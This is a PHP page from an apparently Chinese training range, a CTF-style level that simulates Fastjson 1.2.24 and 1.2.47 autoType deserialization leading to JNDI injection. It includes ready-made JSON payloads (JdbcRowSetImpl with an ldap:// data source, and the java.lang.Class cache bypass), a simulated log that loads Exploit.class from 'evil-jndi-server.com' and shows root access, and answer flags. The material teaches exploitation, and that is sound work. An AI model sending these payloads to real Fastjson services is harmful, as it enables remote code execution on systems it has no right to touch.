<?php
/**
 * Pikachu-Enhanced v2.0 - Fastjson 反序列化与 JNDI 注入 (Fastjson 1.2.24/1.2.47 RCE) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[90] = 'active open';
$ACTIVE[225] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';

$output_log = "";
$status_type = "";
$json_input = $_POST['json_data'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($json_input)) {
    $raw_json = trim($json_input);
    
    // 模拟 Fastjson autoType 特性解析逻辑
    if (stripos($raw_json, '@type') !== false) {
        $decoded = @json_decode($raw_json, true);
        
        // 场景 1: Fastjson 1.2.24 JdbcRowSetImpl JNDI 注入
        if (stripos($raw_json, 'com.sun.rowset.JdbcRowSetImpl') !== false && stripos($raw_json, 'dataSourceName') !== false) {
            $status_type = "danger";
            $output_log = "💥 [Fastjson 1.2.24 autoType 反序列化成功！]\n" .
                          "[+] 识别目标类: com.sun.rowset.JdbcRowSetImpl\n" .
                          "[+] 触发 Setter: setDataSourceName(\"ldap://evil-jndi-server.com:1389/Exploit\")\n" .
                          "[+] 触发 Setter: setAutoCommit(true) -> 调用 connect() 方法\n" .
                          "[+] JNDI Lookup 发起: InitialContext.lookup(\"ldap://...\")\n" .
                          "[+] 远程加载恶意字节码: Exploit.class (static code execution)\n\n" .
                          "🚀 [RCE EXPLOIT SUCCESSFUL]\n" .
                          "    uid=0(root) gid=0(root) groups=0(root)\n" .
                          "    Flag: FLAG{FASTJSON_1_2_24_AUTOTYPE_JNDI_INJECTION_PWNED}";
        }
        // 场景 2: Fastjson 1.2.47 通杀缓存绕过
        elseif (stripos($raw_json, 'java.lang.Class') !== false) {
            $status_type = "danger";
            $output_log = "💥 [Fastjson 1.2.47 通杀 autoType 缓存绕过成功！]\n" .
                          "[+] 第一步: 利用 java.lang.Class 将目标类加载至 TypeUtils.mappings 内存白名单缓存\n" .
                          "[+] 第二步: 第二个 JSON 对象直接实例化目标利用类，避开 checkAutoType 拦截！\n" .
                          "[+] JNDI 注入成功触发 RCE！\n\n" .
                          "Flag: FLAG{FASTJSON_1_2_47_CLASS_CACHE_BYPASS_CHAMPION}";
        } else {
            $status_type = "warning";
            $output_log = "⚠️ [Fastjson 解析] 检测到 @type 指定了类名，但该类在当前 ClassPath 中不具备已知 Gadget 链。";
        }
    } else {
        $status_type = "info";
        $output_log = "ℹ️ [普通 JSON 解析] JSON 格式合法，未包含 @type 特殊反序列化指示符。";
    }
}

$sample_1224 = '{\n  "@type": "com.sun.rowset.JdbcRowSetImpl",\n  "dataSourceName": "ldap://127.0.0.1:1389/Exploit",\n  "autoCommit": true\n}';
$sample_1247 = '{\n  "a": {\n    "@type": "java.lang.Class",\n    "val": "com.sun.rowset.JdbcRowSetImpl"\n  },\n  "b": {\n    "@type": "com.sun.rowset.JdbcRowSetImpl",\n    "dataSourceName": "ldap://127.0.0.1:1389/Exploit",\n    "autoCommit": true\n  }\n}';
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="../unserilization/unserilization.php">反序列化</a></li>
                <li class="active">Fastjson 反序列化 (JNDI 注入)</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 Fastjson 原理" data-content="Fastjson 在解析 JSON 时通过 @type 指定任意反序列化目标类，并通过反射自动调用对应类的 Getter/Setter 方法！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        ☕ Fastjson 反序列化漏洞与 JNDI 注入 (1.2.24 ~ 1.2.47 RCE)
                        <span class="cyber-badge-chip">Java 安全 · autoType 机制 · JNDI 远程加载 · 300 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        阿里巴巴开源的 Fastjson 库在设计时提供了 <code>@type</code> 特性，允许 JSON 字符串指定将数据反序列化为具体的 Java 类。当服务端反序列化 <code>com.sun.rowset.JdbcRowSetImpl</code> 时，会自动调用其 <code>setDataSourceName()</code> 与 <code>setAutoCommit()</code>，从而触发 <code>InitialContext.lookup()</code> 发起 <b>JNDI (RMI / LDAP) 请求</b>，远程加载攻击者服务器上的恶意 <code>Exploit.class</code> 导致任意代码执行！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Control & Payload Generator -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-code" style="color:var(--primary);"></i> JSON 数据提交接口
                            </h4>

                            <form method="POST" action="fastjson_rce.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">输入待解析的 JSON 字符串：</label>
                                    <textarea class="form-control" id="json_input" name="json_data" rows="7" placeholder="输入 JSON 数据..." style="font-family:'Fira Code', monospace; font-size:12.5px;" required><?php echo htmlspecialchars($json_input); ?></textarea>
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速填入经典 Fastjson 漏洞 Payload：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillJson('{\n  \"name\": \"vince\",\n  \"age\": 18\n}')">
                                            <i class="fa fa-info-circle" style="color:#06b6d4;"></i> 正常 JSON 数据
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillJson('<?php echo str_replace("\n", '\n', addslashes($sample_1224)); ?>')">
                                            <i class="fa fa-fire" style="color:#ef4444;"></i> <b>Fastjson 1.2.24 Payload：</b> <code>JdbcRowSetImpl</code> JNDI 注入
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillJson('<?php echo str_replace("\n", '\n', addslashes($sample_1247)); ?>')">
                                            <i class="fa fa-bolt" style="color:#f59e0b;"></i> <b>Fastjson 1.2.47 Payload：</b> <code>java.lang.Class</code> 缓存绕过
                                        </button>
                                    </div>
                                </div>

                                <button type="submit" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:10px;">
                                    <i class="fa fa-play"></i> 发送 Fastjson.parseObject() 请求
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right Column: Trace & Feedback -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> JVM 执行追踪与 JNDI 状态
                            </h4>

                            <?php if (!empty($output_log)): ?>
                                <pre style="background:#090d16; color:<?php echo $status_type === 'danger' ? '#ef4444' : ($status_type === 'warning' ? '#f59e0b' : '#38bdf8'); ?>; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:12px; line-height:1.6; max-height:280px; overflow-y:auto;"><?php echo htmlspecialchars($output_log); ?></pre>
                            <?php else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:30px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-coffee" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                                    在左侧选择 Fastjson 攻击载荷测试反序列化效果
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="java_unserialize.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：Java 反序列化概述</a>
                    <a href="native_unser.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：Java 原生反序列化 (readObject) <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillJson(j) {
    document.getElementById('json_input').value = j.replace(/\\n/g, '\n');
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
